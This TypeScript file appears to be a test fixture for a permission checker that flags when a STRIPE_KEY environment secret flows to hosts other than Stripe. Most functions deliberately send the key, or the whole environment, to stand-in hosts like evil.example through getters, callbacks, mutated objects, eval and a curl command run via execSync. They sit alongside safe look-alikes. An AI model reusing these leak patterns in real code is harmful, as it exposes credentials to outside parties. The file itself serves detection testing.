// Used by test/flows.test.ts, with the rule: env(STRIPE_KEY) may only go to net(api.stripe.com).
import { execSync } from "node:child_process";

/** @perm env(STRIPE_KEY), net(api.stripe.com), net(analytics.example) */
export async function charge(amount: number) {
  const key = process.env.STRIPE_KEY;
  await fetch("https://api.stripe.com/v1/charges", { method: "POST", headers: { authorization: `Bearer ${key}` } });
  await track(amount);
}

function track(amount: number) {
  return fetch("https://analytics.example/event", { method: "POST", body: String(amount) });
}

/** Reads the key and sends to whatever URL it's given. */
export async function relay(url: string) {
  const key = process.env.STRIPE_KEY;
  return fetch(url, { headers: { key: key ?? "" } });
}

/** Sends the whole environment, the key included. */
export async function dumpAll() {
  return fetch("https://logs.example/env", { method: "POST", body: JSON.stringify(process.env) });
}

/** Only ever talks to Stripe: allowed. */
export async function stripeOnly() {
  const key = process.env.STRIPE_KEY;
  return fetch("https://api.stripe.com/v1/balance", { headers: { authorization: `Bearer ${key}` } });
}

/** Reads a different variable: the rule doesn't apply. */
export async function other() {
  const token = process.env.OTHER_TOKEN;
  return fetch("https://analytics.example/event", { headers: { token: token ?? "" } });
}

/**
 * Calls a function that uses the key and returns what Stripe sent back. Without following
 * the value, that result could carry the key, so this is flagged too.
 */
export async function dashboard() {
  await stripeOnly();
  return fetch("https://analytics.example/view");
}

// --- Ways the key reaches a function other than reading it there.

/** Returns the key (or undefined): whoever calls it has the key. */
function stripeKey() {
  return process.env.STRIPE_KEY;
}

/** Gets the key from a getter and sends it elsewhere. */
export async function viaGetter() {
  await fetch("https://evil.example/collect", { method: "POST", body: stripeKey() ?? "" });
}

/** A field holding a function that returns the key. */
class Keys {
  stripe = () => process.env.STRIPE_KEY ?? "";
}

export async function viaField(keys: Keys) {
  await fetch("https://evil.example/field", { method: "POST", body: keys.stripe() });
}

/** Hands the key to a callback, which the caller writes. */
function withKey(use: (key: string) => void) {
  use(process.env.STRIPE_KEY!);
}

export function viaCallback() {
  withKey((key) => void fetch("https://evil.example/cb", { method: "POST", body: key }));
}

/** An object built with the key carries it. */
class StripeClient {
  key = process.env.STRIPE_KEY;
}

export async function viaClient() {
  const client = new StripeClient();
  await fetch("https://evil.example/client", { method: "POST", body: client.key });
}

/** A command or code that can't be verified can send the key anywhere. */
export function viaExec() {
  execSync("curl -d " + process.env.STRIPE_KEY + " https://evil.example");
}

export function viaEval() {
  const key = process.env.STRIPE_KEY;
  eval("fetch('https://evil.example/?k=" + key + "')");
}

/** Uses the key only to call Stripe, and returns nothing: its callers never have the key. */
async function chargeOnly(amount: number): Promise<void> {
  const key = process.env.STRIPE_KEY;
  await fetch("https://api.stripe.com/v1/charges", { method: "POST", headers: { authorization: `Bearer ${key}` }, body: String(amount) });
}

export async function checkout(amount: number) {
  await chargeOnly(amount);
  await fetch("https://analytics.example/checkout");
}

/** A setter can't hand anything back to the code that assigns to it. */
const settings = {
  set level(value: number) {
    void fetch("https://api.stripe.com/v1/log", { method: "POST", headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` }, body: String(value) });
  },
};

export async function configure() {
  settings.level = 2;
  await fetch("https://analytics.example/configured");
}

/** Records a refund with Stripe, synchronously or not: it returns nothing either way. */
function audit(amount: number): void | Promise<void> {
  if (amount > 1000) return fetch("https://api.stripe.com/v1/audit", { headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` } }).then(() => {});
}

export async function refund(amount: number) {
  await audit(amount);
  await fetch("https://analytics.example/refund");
}

/** @perm-unsafe reason:"template compiler, trusted templates only" */
function render(template: string): unknown {
  return eval(template);
}

/** @perm-unsafe accepts render's eval for annotations, but it runs whatever it's given, the key included. */
export function viaUnsafe() {
  const key = process.env.STRIPE_KEY;
  render("fetch('https://evil.example/?k=" + key + "')");
}

// --- Data handed back through an object the caller passes in.

/** Writes the key into the headers it's given: its caller then has the key. */
function authorize(headers: Record<string, string>): void {
  headers.authorization = `Bearer ${process.env.STRIPE_KEY}`;
}

export async function viaHeaders() {
  const headers: Record<string, string> = {};
  authorize(headers);
  await fetch("https://evil.example/report", { method: "POST", headers });
}

/** Hands the key to a method of the object it's given. */
function loadInto(store: Map<string, string>): void {
  store.set("key", process.env.STRIPE_KEY!);
}

export async function viaStore() {
  const store = new Map<string, string>();
  loadInto(store);
  await fetch("https://evil.example/store", { method: "POST", body: store.get("key") });
}

interface Order {
  id: string;
  total: number;
  lines: { sku: string; note?: string }[];
}

/** Writes the key into the elements of a list it's given, through a callback. */
function tagLines({ lines }: Order): void {
  lines.forEach((line) => {
    line.note = process.env.STRIPE_KEY;
  });
}

export async function viaElements(order: Order) {
  tagLines(order);
  await fetch("https://evil.example/lines", { method: "POST", body: JSON.stringify(order) });
}

/** Only reads what it's given, and returns nothing: nothing comes back to its caller. */
async function chargeOrder(order: Order): Promise<void> {
  if (!order || order.total <= 0) return;
  const skus = order.lines.map((line) => line.sku).join(",");
  await fetch("https://api.stripe.com/v1/charges", {
    method: "POST",
    headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` },
    body: `${order.id}:${order.total}:${skus}:${order.id.toUpperCase()}`,
  });
}

export async function checkoutOrder(order: Order) {
  await chargeOrder(order);
  await fetch("https://analytics.example/checkout");
}

/** A logger that takes a string can't hand anything back. */
function logCharge(message: string | number): void {
  void fetch("https://api.stripe.com/v1/log", { method: "POST", headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` }, body: String(message) });
}

export async function logged() {
  logCharge("charged");
  await fetch("https://analytics.example/logged");
}

// --- More ways an object comes back.

function stamp(target: { headers: Record<string, string>; key: string }): void {
  target.headers.authorization = target.key;
}

/** Passes the headers on, written as `{ headers }`, to a helper that writes the key into them. */
function attach(headers: Record<string, string>): void {
  stamp({ headers, key: process.env.STRIPE_KEY! });
}

export async function viaShorthand() {
  const headers: Record<string, string> = {};
  attach(headers);
  await fetch("https://evil.example/shorthand", { method: "POST", headers });
}

/** Calls what it's given, typed any. */
function notify(sink: any): void {
  sink(process.env.STRIPE_KEY);
}

export async function viaAnyCallee(sink: unknown) {
  notify(sink);
  await fetch("https://evil.example/any", { method: "POST", body: String(sink) });
}

/** Calls a method of a member typed any. */
function record(log: { meta: any }): void {
  log.meta.write(process.env.STRIPE_KEY);
}

export async function viaAnyMember(log: { meta: any }) {
  record(log);
  await fetch("https://evil.example/meta", { method: "POST", body: String(log.meta) });
}

function tagLine(line: { note?: string }) {
  line.note = process.env.STRIPE_KEY;
}

/** Writes the key into a list's elements through a function of its own... */
function tagAll(order: Order): void {
  order.lines.forEach(tagLine);
}

export async function viaFunctionReference(order: Order) {
  tagAll(order);
  await fetch("https://evil.example/reference", { method: "POST", body: JSON.stringify(order) });
}

/** ...or a function expression. */
function tagEach(order: Order): void {
  order.lines.forEach(function (line) {
    line.note = process.env.STRIPE_KEY;
  });
}

export async function viaFunctionExpression(order: Order) {
  tagEach(order);
  await fetch("https://evil.example/expression", { method: "POST", body: JSON.stringify(order) });
}

/** Keeps the object under another name, where it could be written: `order ?? fallback`. */
function pickAndTag(order: Order | null, fallback: Order): void {
  const target = order ?? fallback;
  target.lines.push({ sku: "key", note: process.env.STRIPE_KEY });
}

export async function viaAlias(order: Order) {
  pickAndTag(order, order);
  await fetch("https://evil.example/alias", { method: "POST", body: JSON.stringify(order) });
}

/** Callbacks nested deeper than PermLang looks: it assumes the innermost one writes. */
function deepRead(levels: { note?: string }[][][][][][]): void {
  levels.forEach((a) => a.forEach((b) => b.forEach((c) => c.forEach((d) => d.forEach((e) => e.forEach((f) => f.note === process.env.STRIPE_KEY))))));
}

export async function viaDeepCallbacks(levels: { note?: string }[][][][][][]) {
  deepRead(levels);
  await fetch("https://evil.example/deep", { method: "POST", body: JSON.stringify(levels) });
}

// --- Look-alikes that only read what they're given.

interface TaggedOrder extends Order {
  tags: string[];
}

/** Tests what it's given in every way PermLang knows, and replaces only its own copy. */
async function chargeIfReady(order: TaggedOrder | null, previous: TaggedOrder | undefined, at: Date, counts: { tries: number; last?: string }): Promise<void> {
  if (order) counts.tries++;
  while (previous && previous.total) previous = undefined;
  const ready = order ? order.total > 0 : false;
  if (!order || order === previous || !("id" in order) || typeof order !== "object" || !(order instanceof Object)) return;
  delete counts.last;
  do {
    await fetch("https://api.stripe.com/v1/charges", {
      method: "POST",
      headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` },
      body: `${ready}:${+at}:${order.tags.includes("vip")}:${order.tags.map(String).join(",")}:${order.lines.some((line) => line.sku === "x")}`,
    });
  } while (ready && order);
  if (counts.tries > 3 || (previous ?? order) === order) void order;
}

export async function checkoutIfReady(order: TaggedOrder) {
  await chargeIfReady(order, undefined, new Date(), { tries: 0 });
  await fetch("https://analytics.example/ready");
}

/** Stores the object by assigning it to a variable, where it could be written. */
function keepAndTag(order: Order): void {
  let kept: Order | undefined;
  kept = order;
  kept.lines.push({ sku: "key", note: process.env.STRIPE_KEY });
}

export async function viaAssignment(order: Order) {
  keepAndTag(order);
  await fetch("https://evil.example/assigned", { method: "POST", body: JSON.stringify(order) });
}
